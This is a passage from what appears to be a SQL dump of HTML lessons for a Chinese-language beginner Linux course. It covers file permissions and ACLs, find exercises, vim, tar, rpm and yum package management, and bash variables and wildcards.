/home/yyy/<br>drwxrwxrwt 2 root hr 4096 09-06 14:13 /home/yyy/<br><br>==========================================================================================================<br><br>特殊权限位为大写，代表该权限位成员无执行权限，特殊权限位为小写时，该权限位成员有执行权限<br><br>[root@localhost test]#&nbsp;chmod 7777 aa.txt&nbsp;<br>[root@localhost test]#&nbsp;ll aa.txt&nbsp;<br>-rwsrwsrwt 1 root root 0 09-28 15:29 aa.txt<br>[root@localhost test]#&nbsp;chmod a-x aa.txt&nbsp;<br>[root@localhost test]#&nbsp;ll<br>总计 0<br>-rwSrwSrwT 1 root root 0 09-28 15:29 aa.txt<br>[root@localhost test]#&nbsp;chmod a+x aa.txt&nbsp;<br>[root@localhost test]#&nbsp;ll<br>总计 0<br>-rwsrwsrwt 1 root root 0 09-28 15:29 aa.txt<br><br>==========================================================================================================<br><br>习题：<br><br>由于传统的UGO权限只能将文件权限分配给一个用户（属主）及一个组（属组）访问 ：<br><br>场景：/var/public<br>要求<br>1. tom能够读写<br>2. jack只读<br>3. alice没有权限<br>4. hr组能读写<br>5. sale能读写<br>6. tech没有权限<br></dd><dt>ACL</dt><dd>ACL：访问控制列表（UGO权限的扩展）<br><br>命令：<br>setfacl	getfacl<br><br>文件系统（分区）必须要支持ACL功能<br>挂载磁盘并且开acl功能&nbsp;<br>mount -o acl /dev/sda8 /mnt<br><br>================================================<br><br>[root@station230 ~]#&nbsp;mkdir /var/public<br>[root@station230 ~]#&nbsp;ll -d /var/public/<br>drwxr-xr-x 2 root root 4096 09-06 15:55 /var/public/<br>[root@station230 ~]#&nbsp;getfacl /var/public/<br>getfacl: Removing leading \'/\' from absolute path names<br># file: var/public<br># owner: root<br># group: root<br>user::rwx<br>group::r-x<br>other::r-x<br><br>[root@station230 ~]#&nbsp;cd /var/<br>[root@station230 var]#&nbsp;setfacl -m u:tom:rw public/<br>[root@station230 var]#&nbsp;ll -d public/<br>drwxrwxr-x+ 2 root root 4096 09-06 15:55 public/<br><br>=====================================================<br><br>一旦设置了ACL权限，原属组位置的权限变成了MASK权限<br><br>[root@station230 var]#&nbsp;getfacl public/<br># file: public<br># owner: root<br># group: root<br>user::rwx<br>user:tom:rw-<br>group::r-x<br>mask::rwx<br>other::r-x<br><br>======================================================<br><br>-m设置acl权限<br><br>[root@station230 var]#&nbsp;setfacl -m u:alice:- public/<br>[root@station230 var]#&nbsp;ll -d public/<br>drwxrwxr-x+ 2 root root 4096 09-06 15:55 public/<br>[root@station230 var]#&nbsp;getfacl public/<br># file: public<br># owner: root<br># group: root<br>user::rwx<br>user:alice:---<br>user:tom:rw-<br>group::r-x<br>mask::rwx<br>other::r-x<br><br>man setfacl<br>/EXAMPLES<br><br>=======================================================<br><br>-x取消facl权限<br><br>[root@station230 ~]#&nbsp;setfacl -x u:jack /var/public/<br>[root@station230 ~]#&nbsp;getfacl /var/public/<br>getfacl: Removing leading \'/\' from absolute path names<br># file: var/public<br># owner: root<br># group: root<br>user::rwx<br>user:alice:---<br>user:tom:rw-<br>group::r-x<br>group:tech:---<br>group:hr:rw-<br>group:sale:rw-<br>mask::rwx<br>other::r-x<br><br>========================================================<br><br>-b取消所有扩展acl权限<br><br>[root@station230 ~]#&nbsp;setfacl -b /var/public/<br>[root@station230 ~]#&nbsp;ll -d /var/public/<br>drwxr-xr-x 2 root root 4096 09-06 15:55 /var/public/<br>[root@station230 ~]#&nbsp;getfacl /var/public/<br>getfacl: Removing leading \'/\' from absolute path names<br># file: var/public<br># owner: root<br># group: root<br>user::rwx<br>group::r-x<br>other::r-x<br><br>=========================================================<br><br>MASK权限：它决定了除了属主和其他人以外的所有用户的最大权限<br><br>[root@station230 ~]#&nbsp;ll -d /var/public/<br>drwxrwxr-x+ 2 root root 4096 09-06 15:55 /var/public/<br>[root@station230 ~]#&nbsp;<br>[root@station230 ~]#&nbsp;setfacl -m mask::r /var/public/<br>[root@station230 ~]#&nbsp;ll -d /var/public/<br>drwxr--r-x+ 2 root root 4096 09-06 15:55 /var/public/<br><br>[root@station230 ~]#&nbsp;getfacl /var/public/<br>getfacl: Removing leading \'/\' from absolute path names<br># file: var/public<br># owner: root<br># group: root<br>user::rwx<br>user:alice:r--<br>user:jack:rwx&nbsp;#effective:r--<br>group::r-x&nbsp;#effective:r--<br>group:hr:rw-&nbsp;#effective:r--<br>mask::r--<br>other::r-x<br><br>[root@station230 ~]#&nbsp;setfacl -m mask::- /var/public/<br>[root@station230 ~]#&nbsp;getfacl /var/public/<br>getfacl: Removing leading \'/\' from absolute path names<br># file: var/public<br># owner: root<br># group: root<br>user::rwx<br>user:alice:r--	#effective:---<br>user:jack:rwx	#effective:---<br>user:tom:rwx	#effective:---<br>group::r-x	#effective:---<br>group:hr:rw-	#effective:---<br>mask::---<br>other::---<br></dd><dt>文件查找</dt><p></p><dd><span>文件查找</span><br><br>which	只查命令	echo $PATH<br>locate	需要updatedb支持<br>find<br>grep<br>whereis cat<br><br><span>find命令<br></span>=================================================<br><br>语法：find 目录1 目录2 ... 表达式1 表达式2<br><br>==================================================<br><br><span>文件名：<br></span><br><span>find /etc -name \"ifcfg-eth0\"<br>find /etc -name \"ifcfg*\"<br>find . -iname aaa	忽略大小写<br><br>==================================================<br><br></span><span>文件时间属性：</span><span><br><br>find /etc -mtime +5<br>find /etc -mtime 5<br>find /etc -mtime -5<span>&nbsp;</span><br>find /etc -ctime -5<br>find /etc -atime -5<br>find . -mtime +10	10天之前<br>find . -mtime -10	10天之内<br>find . -mtime -10 -a -mtime +5<br>find . -mtime +10 -o -mtime -5<br><br>===================================================<br></span><span><br>文件大小：<br></span><span><br>find /etc -size +5M<br>find /etc -size 5M<br>find /etc -size -5M<br><br>===================================================<br><br></span><span>文件拥有者和所属组：</span><span><br><br>find /home -user alice<br>find /home -group hr<br><br>find / -nouser -a -nogroup = find / -nouser -nogroup<br>find / -nouser -o -nogroup<br><br>===================================================<br><br></span><span>文件类型：</span><span><br><br>find /etc -type d<br>find /etc -type d -ls<br>find /etc -type f</span><br><br><span>文件类型及表示符号：</span><br>f 普通文件<br>d 目录文件<br>l 链接文件<br>b 块设备文件<br>p 管道文件<br>s 套节字文件<br>c 字符文件<br><br>======================================================<br><span><br>文件权限：</span><br><br>find . -perm 200	正好匹配<br>find . -perm +200	任意匹配<br>find . -perm -200	完全匹配<br><br>[root@station230 pulic]#<span><span>&nbsp;</span>find /sbin -perm -4000 -ls</span><br>1044721 80 -rwsr-xr-x 1 root root 73108 1月 18 2012 /sbin/mount.nfs<br>1044726 80 -rwsr-xr-x 1 root root 73112 1月 18 2012 /sbin/umount.nfs4<br>1044624 20 -rwsr-xr-x 1 root root 12376 10月 22 2010 /sbin/pam_timestamp_check<br>1044725 80 -rwsr-xr-x 1 root root 73112 1月 18 2012 /sbin/umount.nfs<br>1044722 80 -rwsr-xr-x 1 root root 73112 1月 18 2012 /sbin/mount.nfs4<br>1044625 24 -rwsr-xr-x 1 root root 19296 10月 22 2010 /sbin/unix_chkpwd<br><br>[root@station230 pulic]#<span>&nbsp;</span><span>find /usr/bin -perm -4000 -ls</span><br>3036718 156 ---s--x--- 1 root stapusr 149408 12月 6 2011 /usr/bin/staprun<br>3036592 312 -rwsr-sr-x 1 root root 309932 10月 20 2011 /usr/bin/crontab<br>3035943 24 -rwsr-xr-x 1 root root 18736 10月 31 2011 /usr/bin/rcp<br>3036244 20 -rws--x--x 1 root root 19192 12月 21 2011 /usr/bin/chsh<br>3036089 24 -rwsr-xr-x 1 root root 23420 8月 3 2010 /usr/bin/passwd<br>3035946 16 -rwsr-xr-x 1 root root 8972 10月 31 2011 /usr/bin/rsh<br>3036700 184 ---s--x--x 2 root root 177856 11月 29 2011 /usr/bin/sudo<br>3036700 184 ---s--x--x 2 root root 177856 11月 29 2011 /usr/bin/sudoedit<br>3035657 1852 -rws--x--x 1 root root 1890852 1月 6 2012 /usr/bin/Xorg<br>3035945 20 -rwsr-xr-x 1 root root 14388 10月 31 2011 /usr/bin/rlogin<br>3036620 48 -rwsr-xr-x 1 root root 43492 11月 16 2009 /usr/bin/at<br>3036793 28 -rwsr-xr-x 1 root root 24588 10月 25 2011 /usr/bin/newgrp<br>3036490 56 -rwsr-xr-x 1 root root 50616 10月 25 2011 /usr/bin/gpasswd<br>3036662 20 -rws--x--x 1 root root 17996 12月 21 2011 /usr/bin/chfn<br>3036143 48 -rwsr-xr-x 1 root root 47408 10月 25 2011 /usr/bin/chage<br><span><br>find /sbin -perm 0644<br>find /sbin -perm -0600<br>find /sbin -perm -4000<br>find /sbin -perm -2000<br>find /sbin -perm -1000<br>find /sbin -perm -0640<br>find /sbin -perm -6000	必须同时有4和2<br>find /sbin -perm +6000</span>	有4或者有2<br><br>================================================<br><br><span>查找到后执行<br><br></span>find / -name ruan.txt -exec rm {} \\;<br>find / -name ying.txt -ok rm {} \\; 交互式执行<br>find / -type f -exec file {} \\;<br>find / -type f | xargs file<br>cut -d: -f 1 /etc/passwd | xargs<br>cut -d: -f 1 /etc/passwd | xargs mkdir<span>&nbsp;</span><br>find / -perm +7000 -exec cp -rf {} /tmp/bin \\;<br><br>========================================================================<br><br>思考：<br>cp -rf /etc /tmp/<br>1. 对/tmp/etc以及下面的所有子目录设置777权限，所有文件权限不变<br><br>2. 将/etc/目录下的所有子目录（不包含文件）复制到/var/tmp下，必须保证原目录结构不变<br>find /etc -type d -exec mkdir -p /var/tmp/{} \\;<br><br><br><dl><dt>find命令练习</dt><dd><span>1.查找名字为abc2.txt的文件</span><br><br>find / -name abc2.txt<br><br>==========================================================================<br><br><span>2.查找到系统中所有的套节字文件</span><br><br>find / -type s<br><br>==========================================================================<br><br><span>3.查找/home/所有的没有拥有者的文件并且交互式删除</span><br><br>find /home/ -nouser -ok rm {} \\;<br><br>==========================================================================<br><br><span>4.在/tmp/test目录下小于18M 或者大于26M的文件 并且长格式显示出来</span><br><br>find /tmp/test/ \\(-size -18M -o -size +26M \\) -ls<br>ls -l `find /tmp/test -size -18M -o -size +26M`<br><br>==========================================================================<br><br><span>5.在/tmp/test目录下查找大于14M并且小于25M的文件,将找到后的文件拷贝到/opt下</span><br><br>find /tmp/test -size +14M -a -size -25M -exec cp {} /opt \\;<br>cp `find /tmp/test -size +14M -a -size -25M` /opt/<br><br>==========================================================================<br><span><br>6.在/tmp/test目录下查找大于18M并小于25M的文件,将找到的文件改名字为abcd.txt</span><br><br>find /tmp/test/ -size +18M -a -size -25M -exec mv {} /tmp/test/abcd.txt \\;<br>mv `find /tmp/test/ -size +18M -a -size -25M` /tmp/test/abcd.txt<br><br>============================================================================<br><br><span>7.以下命令会查出那些文件</span><br><br>1).find /tmp/test -perm 755<br>find /tmp/test/ -perm 755<br>2).find /tmp/test -perm +266<br>abc1 abc2 abc3 abc4 abc5<br>3).find /tmp/test -perm -241<br>abcd.txt abc4.txt</dd></dl></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/ubuntu14.04.jpeg','index.alauda.cn/library/ubuntu:14.04.4','2016-10-13 10:51:58',1,NULL,'',0,''),(65,'linux基础课程训练四','关于vi，vim软件包方面的基础操作','<dt><p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p></dt><dt><br></dt><dt><dt>vim/vi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;直接在本虚拟系统中可以使用vi 但是vim不能使用，建议用户在自己机器装虚拟机操作。</dt><dd>vim(文本编辑器)<br><br>配置文件:/etc/vimrc是vim的全局配置文件<br><br>===================================================<br><br>由命令模式进入输入模式<br><br>a 当前字符后输入<br>A 当前行行尾输入<br>i 当前字符前输入<br>I 当前行行首输入<br>o 当前行下一行输入<br>O 当前行上一行输入<br>s 删除当前字符后输入<br>S 删除当前行后输入<br><br>home键 行首<br>end键 行尾<br>ESC键 返回命令模式<br><br>====================================================<br><br>命令模式(用vim打开文件后默认为命令模式)<br><br>ctrl+r	重做&nbsp;<br>u 撤销<br>yy&nbsp;复制一行&nbsp;<br>p 粘贴<br>20yy 复制20行<br>dd 剪切一行<br>20dd 剪切20行<br>dd 删除一行<br>20dd 删除20行<br><br>^ 行首<br>$ 行尾<br>d^ 删除当前字符到行首<br>d$ 删除当前字符到行尾<br>w 下一个单词的首字符<br>dw 删除或剪切一个单词<br>x 删除一个字<br>r 替换字符，按下r后直接输入要更改的字<br>R 替换多个字符<br>cw 修正单词，例如 line 光标放在i上，按下cw后ine会消失，在l后输入要更正的内容，输入cw后进入文本状态<br>ctrl+g 显示光标位置及文件状态信息<br>{} 括号是成对存在的{ } 将光标放在一个括号上,其配对的符号会显示相同颜色<br>v 可视模式 可以进行复制粘贴操作&nbsp;<br>J 合并两行<br><br>G 尾行<br>gg 首行 例如：输入572G定位到572行<br>dgg 删除当前行到首行<br>dG 删除当前行到尾行<br><br>=====================================================<br><br>末行模式<br><br>:w q wq q! w! wq!<br>:w newfile 另存<br>:4,7w newfile2	另存<br>:e /root/tt.txt 打开文件<br>:r /root/tt.txt 追加读入<br>:e! 重新打开源文件<br><br>:set nu	设置行号<br>:set nonu	<br>:set autoindent 自动缩进<br>:set noautoindent<br>:set sp newfile	打开一个新的文件<br><br>===================================================<br><br>查找<br><br>/ab	从前往后找<br>?ab	从后往前找<br>n	向下翻页<br>N	向上翻页<br><br>替换<br><br>%s/ab/$$/gc	%所有行 s替换 g全局 c交互模式<br>3,7s/ab/$$/gc	替换 3-7行的ab为$$<br>%s/^ //g	将每行的第一个空格删掉（前提是第一列有空格）&nbsp;<br>%s/ //g	将每行的所有空格删掉<br>%s/ //	将每行出现的首个空格删掉，每行空格可能有多个&nbsp;<br>%s/\\s//	将每行出现的首个空格删掉	\\s表示转义为空格&nbsp;<br>%s/\\n/ /	将每行的回车符删掉，一行回车符只有一个	\\n 回车<br>%s/\\t//	将每行出现的首个换行符删掉	\\t 制表符&nbsp;<br><br>去掉空行<br>g/^$/d	d删除<br>g/^\\s*$/d	\\转义 s空格 *表示0到多个 删除所有空行<br><br>:X	文件加密<br><br>======================================================<br><br>多文件操作<br><br>vim　aa.txt　cc.txt　tt.txt<br>:args next prev last first ctrl+^<br><br>vimdiff aa.txt cc.txt tt.txt<br>ctrl + w + w<br><br>vim -O aa.txt cc.txt tt.txt<br>vim -o aa.txt cc.txt tt.txt<br><br>vim的帮助文档:/usr/share/vim/vim70/tutor/tutor.zh.euc<br>vimtutor<br>字符集转换<br>iconv -f gb18030 -t utf-8 /usr/share/vim/vim70/tutor/tutor.zh.euc -o /root/Desktop/tutor.zh.euc 中文<br>iconv -f gb18030 -t utf-8 /usr/share/vim/vim70/tutor/tutor -o /root/Desktop/tutor 英文<br>-f 源字符集<br>-t 转换后字符集<br>-o 转换后输出的文件</dd></dt><dt><br></dt><dt></dt><dt>打包解包压缩解压</dt><dd>文件的打包和压缩&nbsp;<br><br>命令：<br>tar	gzip	bzip2<br><br>打包和压缩分开做：<br>==============<br><br>1. 打包<br>[root@station230 ~]#&nbsp;tar -cvf etc1.tar /etc<br>[root@station230 ~]#&nbsp;tar -cf etc2.tar /etc/<br><br>2. 压缩<br>[root@station230 ~]#&nbsp;gzip etc1.tar&nbsp;<br>[root@station230 ~]#&nbsp;bzip2 etc2.tar&nbsp;<br>[root@station230 ~]#&nbsp;ll -h etc*<br>-rw-r--r-- 1 root root 11M 09-07 12:38 etc1.tar.gz<br>-rw-r--r-- 1 root root 6.9M 09-07 12:41 etc2.tar.bz2<br><br>解压解包分开做：<br>============<br><br>1. 解压<br>[root@station230 ~]#&nbsp;gzip -d etc1.tar.gz&nbsp;<br>[root@station230 ~]#&nbsp;bzip2 -d etc2.tar.bz2<br><br>2. 解包<br>[root@station230 ~]#&nbsp;tar -xvf etc1.tar<br><br>===================================================<br><br>打包压缩一起做：<br>============<br><br>[root@station230 ~]#&nbsp;tar -czvf etc1.tar.gz /etc	// -z 表示调用gzip<br>[root@station230 ~]#&nbsp;tar -cjvf etc2.tar.bz2 /etc	// -j 表示调用bzip2<br><br>解包解压一起做:<br>============<br><br>[root@station230 ~]#&nbsp;tar -xvf etc1.tar.gz<br>[root@station230 ~]#&nbsp;tar xvf etc1.tar.gz<br>[root@station230 ~]#&nbsp;tar -xvf etc1.tar.gz -C /tmp<br><br>所有解包都可以用一下命令执行：<br>tar xf 文件<br><br><br><br><br><br></dd><dt>软件包安装</dt><dd>软件包安装<br><br>rpm包<br>半源码包<br>源码包<br>二进制文件包<br><br>linux两种软件包：<br>Redhat/Centos/Fedora	RPM	rpm,rpmbuild	yum	<br>Ubuntu/Debian	DPKG	dpkg	apt<br><br>notecase-1.9.8-1.fc6.i386.rpm<br>软件包名 版本 发布次数 平台<br>平台：i386(32),x86_64(64),noarch<br><dl><dt>RPM包</dt><dd>RPM (rpm,yum)&nbsp;<br><br>rpm管理 （依赖性关系需要手动解决）<br><br>rpm -ivh httpd-2.2.3-63.el5.i386.rpm	-i install v 过程 h 百分比<br>rpm -ivh --root=/tmp/ httpd-2.2.3-63.el5.i386.rpm 指定路径安装<br>rpm -ivh httpd-2.2.3-63.el5.i386.rpm<br>rpm -ivh httpd-manual-2.2.3-63.el5.i386.rpm<br>rpm -q httpd	<br>rpm -qa |grep httpd	查询程序安装包信息<br>rpm -ql httpd	查询软件的安装位置<br>rpm -qf /etc/passwd	通过文件检索软件包<br>rpm -qi httpd	查询安装包信息<br>rpm -qc httpd<br>rpm -qd httpd<br>rpm -qf `which nmap`	查询命令的安装包<br>rpm -e httpd<br>rpm -e httpd --nodeps<br>rpm -qip notecase-1.9.8-1.fc6.i386.rpm	查询未安装软件包详细信息<br>rpm -qpl caching-nameserver-9.3.6-20.P1.el5.i386.rpm	未安装软件安装时的路径<br>rpm -ivh httpd-2.2.3-63.el5.i386.rpm --force 强制安装<br>rpm -e apr-devel --nodeps	不检测依赖关系卸载<br><br>导入校验key<br>rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release<br>rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-beta<br><br>===========================================================================================<br><br>安装<br><br>[root@station230 Server]# rpm -ivh mysql-5.0.77-4.el5_6.6.i386.rpm&nbsp;<br>warning: mysql-5.0.77-4.el5_6.6.i386.rpm: Header V3 DSA signature: NOKEY, key ID 37017186<br>error: Failed dependencies:<br>perl(DBI) is needed by mysql-5.0.77-4.el5_6.6.i386<br>===========================================================================================<br><br>yum管理 repodata(依赖性关系数据库)<br><br>红帽系统yum软件库在镜像里的位置<br>Server<br>Cluster<br>ClusterStorage<br>VT<br><br>======================================================<br><br>使用yum的步骤：<br><br>1. 指定仓库<br>cd /etc/yum.repos.d/<br>vim rhel-debuginfo.repo<br>[Server]<br>name=Server<br>baseurl=file:///media/Server<br>enabled=1<br>gpgcheck=1	key的校验，没有导入公钥时可以关闭<br><br>[VT]<br>name=VT<br>baseurl=file:///media/VT<br>enabled=1<br>gpgcheck=1	<br><br>[Cluster]<br>name=Cluster<br>baseurl=file:///media/Cluster<br>enabled=1<br>gpgcheck=1<br><br>[ClusterStorage]<br>name=ClusterStorage<br>baseurl=file:///media/ClusterStorage<br>enabled=1<br>gpgcheck=1<br><br>2. 安装<br>rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release	//导入红帽公钥<br>yum clean all<br>yum -y install mysql<br>yum -y install mysql*<br>yum -y install vsftpd mysql httpd<br><br>扩展：自定义仓库<br><br>(1)安装软件<br>yum -y install createrepo<br>createrepo 安装包目录 生成repodata<br><br>(2)准备仓库<br>[root@station230 soft]# pwd<br>/var/ftp/pub/soft<br>[root@station230 soft]# createrepo .<br><br>1/1 - notecase-1.9.8-1.fc6.i386.rpm<br>Saving Primary metadata<br>Saving file lists metadata<br>Saving other metadata<br>[root@station230 soft]# ls<br>notecase-1.9.8-1.fc6.i386.rpm repodata<br><br>(3)安装<br>vim /etc/yum.repos.d/soft.repo<br>[soft]<br>name=private<br>baseurl=file:///var/ftp/pub/soft<br>enabled=1<br>gpgcheck=0<br><br>yum clean all<br>yum -y install notecase<br>yum -y update vsftpd<br><br># yum -y localinstall toilet-0.3-1.mga3.i586.rpm --nogpgcheck<br># rpm -ivh banner-1.3.2-1.fc17.i686.rpm --force --nodeps<br><br>============================================================<br><br>常用命令<br><br>yum clean all	清空yum缓存<br>yum list	测试yum<br>yum install httpd-devel<br>yum remove apr-devel<br>yum reinstall httpd<br>yum provides */dhcpd.conf&nbsp;查找dhcpd.conf文件属于哪个RPM包<br>yum list tftp<br>yum list | grep tftp<br>yum -y remove tftp<br><br>通过YUM管理软件包组<br>yum grouplist<br>yum groupinfo \"开发库\"<br>yum -y groupinstall \"开发库\" \"开发工具\"<br><br><br><br><span style=\"font-weight: 700;\">SRPM包</span><br></dd><dd>SRPM (rpmbuild,rpm)<br><br>安装rpmbuild软件<br>yum provides */rpmbuild<br>yum -y install rpm-build<br><br>[root@station230 Desktop]#&nbsp;ls /usr/src/redhat/<br>BUILD RPMS SOURCES SPECS SRPMS<br>[root@station230 Desktop]#&nbsp;tree /usr/src/redhat/<br>/usr/src/redhat/<br>|-- BUILD<br>|-- RPMS<br>| |-- athlon<br>| |-- geode<br>| |-- i386<br>| |-- i486<br>| |-- i586<br>| |-- i686<br>| `-- noarch<br>|-- SOURCES<br>|-- SPECS<br>`-- SRPMS<br><br>rpm -q bc<br>rpm -e bc --nodeps<br>======================================================================<br><br>rpm -ivh bc-1.06.95-1.el6.src.rpm --nomd5<br>ls /usr/src/redhat/SOURCES/	//会生成源码包<br>ls /usr/src/redhat/SPECS/	//会生成*.spec<br><br>rpmbuild -ba /usr/src/redhat/SPECS/*.spec&nbsp;//编译，生成rpm包<br>ls /usr/src/redhat/RPMS/<br>athlon geode i386 i486 i586 i686 noarch	//*.rpm<br><br>======================================================================<br><br>rpm -ivh /usr/src/redhat/RPMS/i386/*.rpm<br>rpm -Uvh /usr/src/redhat/RPMS/i386/*.rpm<br><br><br><span style=\"font-weight: 700;\">tarball包(源码包)</span><br></dd><dd>tarball(SOURCE)<br><br>tar xvf httpd-2.2.11.tar.bz2 -C /usr/local/src	#关注：INSTALL README<br><br>Quick Start - Unix<br>------------------<br>./configure --prefix=PREFIX<br>make<br>make install<br>PREFIX/bin/apachectl start<br><br><br>源码包安装三步曲:<br><br>1. #&nbsp;./configure --prefix=/usr/local/apache2	//检查环境，指定安装选项等参数，生成 Makefile<br><br>2. #&nbsp;make	//编译<br><br>3. #&nbsp;make install	//安装<br><br>[root@station230 httpd-2.2.11]#&nbsp;ls /usr/local/apache2/<br>bin build cgi-bin conf error htdocs icons include lib logs man manual modules<br>[root@station230 httpd-2.2.11]#&nbsp;ls /usr/local/apache2/conf/httpd.conf&nbsp;<br>/usr/local/apache2/conf/httpd.conf<br><br>[root@station230 httpd-2.2.11]#&nbsp;/usr/local/apache2/bin/apachectl start<br><br>编译选项：<br>./configure --help 选项<br>--prefix=DIR<br>--enable-ssl<br>--disable-filter<br>--with-apr=PATH	例如 --with-apr=/usr/local/apr --with-apr<br>--with-apr-util=PATH&nbsp;<br><br>================================================================================<br><br>二进制bin包<br><br>[root@station230 pub]#&nbsp;chmod a+x jdk-6u27-linux-i586.bin&nbsp;<br>[root@station230 pub]#&nbsp;./jdk-6u27-linux-i586.bin&nbsp;</dd></dl></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.png','centos:latest','2016-10-13 10:53:54',1,NULL,'',0,''),(66,'linux基础课程训练五','linux管道，重定向以及一些高级命令的使用','<dt><p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用。\r\n</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p></dt><p>Bash Shell基本功能：<br><br>历史命令<br>命令和文件补全<br>快捷键<br>命令别名<br>作业控制（前台、后台）nohup<br>脚本<br>通配符<br></p><dl><dt>变量</dt><dd><span>1.环境变量</span><br>环境变量是一个具有特定名字的对象，它包含了一个或者多个应用程序所将使用到的信息。<br>例如path，当要求系统运行一个程序而没有告诉它程序所在的完整路径时，系统除了在当前目录<br>下面寻找此程序外，还应到path中指定的路径去找。用户通过设置环境变量，来更好的运行进程<br>环境变量:系统在启动过程中预先指定好的一系列的变量.比如当前用户是谁 当前shell是什<br>么 当前用户的家目录在什么位置等等<br><br><span>2.预定义变量</span><br>预定义变量:系统预定义好的 和进程名称 进程编号 进程参数 进程返回值相关<br><br><span>3.位置变量</span><br>和命令行参数相关<br><br><span>4.自定义变量</span><br>用户自己定义的变量<br><br>=============================================================================<br><br><span>变量的范围</span><br>自定义变量------环境变量<br>局部变量---------全局变量<br><br>===============================================<br><br><span>shell变量功能</span><br>设置、查看、引用、取消<br>\' \' 单引<br>\" \" 双引<br>` ` 反引<br>$<br>()<br>\\<br>echo ${name}<span>&nbsp;</span><br>set<br>unset<br><br>================================================<br><br><span>子进程仅会继承父进程的环境变量，不会继承你进程的自定义变量</span><br>export school=Uplooking<br>export city<br><br>================================================<br><br><span>释放export定义的自定义变量</span><br>unset 变量名称<br><br>=================================================<br><br><span>别名功能</span><br>alias<br>alias echo=\'echo -n\'<br>alias vi=\'vim\'<br>unalias echo<br><br><br><br><br><br><br></dd><dt>Shell操作环境</dt><dd><span>shell操作环境</span><br><br>====================================================<br><br><span>路径与命令查找顺序<br></span><br><span>1. 以相对路径或绝对路径执行的命令</span>	<br>/bin/ls /<br>cd /bin; ./ls /<br>./configure<br><span>2. 别名</span><br><span>3.shell内置命令</span><br><span>4. 从$PATH找到第一个命令</span><br><br>====================================================<br><br>~.bash_history	记录用户执行过的历史命令(当用户退出时写入)<br>~.bash_logout	当用户退出时执行的命令<br>~.bashrc	shell级别的环境变量配置文件	用户别名<br>~.bash_profile 登录级别的配置文件	用户搜索命令的位置<br><br>/etc/bashrc	全局bashrc配置文件(shell)<br>/etc/profile	全局bash_profile配置文件(登录)<br><br>====================================================<br><br><span>bash登录和欢迎信息</span><span><br></span><br>/etc/issue	man mingetty<br>/etc/issue.net<br>/etc/motd<br><br>====================================================<br><br><span>影响bash环境配置文件<br></span><br>login shell	取得bash时需要完整的登录过程<br>non-login shell	取得bash时不需要重复登录<br><br><span>login shell读取的文件</span><br>1. /etc/profile	系统级别配置文件<br>2. ~/.bash_profile	用户级别的配置文件 用户的自定义的环境变量 source .bash_profile<br>ORACLE_HOME=/u01<br>export ORACLE_HOME）<br>调用~/.bashrc	用户级	定义别名<br>调用/etc/bashrc	系统级<br><br><span>non-login shell读取文件</span><br>1. ~/.bashrc<br>调用/etc/bashrc<br><br><br><br><br></dd><dt>通配符</dt><dd><br><span>通配符是shell解释的 正则表达式是命令解释的</span><br><br>==============================================================================<br><br><span>*</span>	匹配任所有字符<br><span>?</span>	匹配一个字符<br><span>[]</span>	匹配一个范围<br><span>{}</span>	如touch abc{a,b,c}{1..3}.txt<br><br>==============================================================================<br><br><span>*<span>&nbsp;</span></span><br><br>[root@station230 ~]# ls file*<br>file1 file14 file2 file2012-09-08<span>&nbsp;</span><br><br><span>?<span>&nbsp;</span></span><br>[root@station230 ~]# ls file?<br>file1 file2<br>[root@station230 ~]# ll t?st<br>-rw-r--r-- 1 root root 0 09-08 18:41 tast<br>-rw-r--r-- 1 root root 0 09-08 18:41 test<br><br><span>[]<span>&nbsp;</span></span><br>[root@station230 ~]# ll t[ea]st<br>-rw-r--r-- 1 root root 0 09-08 18:41 tast<br>-rw-r--r-- 1 root root 0 09-08 18:41 test<br><br><span>[-]<span>&nbsp;</span></span><br>[root@station230 ~]# touch file1.txt file3.txt<br>[root@station230 ~]# ll file[0-9].txt<br>-rw-r--r-- 1 root root 0 09-08 18:42 file1.txt<br>-rw-r--r-- 1 root root 0 09-08 18:42 file3.txt<br><span><br>[^]<span>&nbsp;</span></span><br>[root@station230 ~]# ll file*<br>-rwsrwsrwt 1 root root 8 09-07 14:06 file1<br>-rw-r--r-- 1 root root 12 09-08 11:44 file14<br>-rw-r--r-- 1 root root 0 09-08 18:42 file1.txt<br>-rw-r--r-- 1 root root 172 09-07 14:11 file2<br>-rw-r--r-- 1 root root 0 09-08 16:37 file2012-09-08<br>-rw-r--r-- 1 root root 0 09-08 18:42 file3.txt<br><br>[root@station230 ~]# ll file[^1].txt<br>-rw-r--r-- 1 root root 0 09-08 18:42 file3.txt<br><br>[root@station230 ~]# ll file[^1]*<br>-rw-r--r-- 1 root root 172 09-07 14:11 file2<br>-rw-r--r-- 1 root root 0 09-08 16:37 file2012-09-08<br>-rw-r--r-- 1 root root 0 09-08 18:42 file3.txt<br><br><br>===============================================================================<br><br><span>引号</span><span><br></span><br>在向程序传递任何参数之前，程序会扩展通配符和变量。这里所谓扩展的意思是程序<br>会把通配符（比如*）替换成合适的文件名，把变量替换成变量值。为了防止程序作这种替<br>换，您可以使用引号。<br><br><span>单引号</span>	全引用。引号内全部内容都转义为普通字符<br><span>双引号</span>	部分引用。除引号内的$ \\ ` \" 不转义成字符，保留其特殊含义，其余内容都转义为普通字符<br><span>反引号</span>	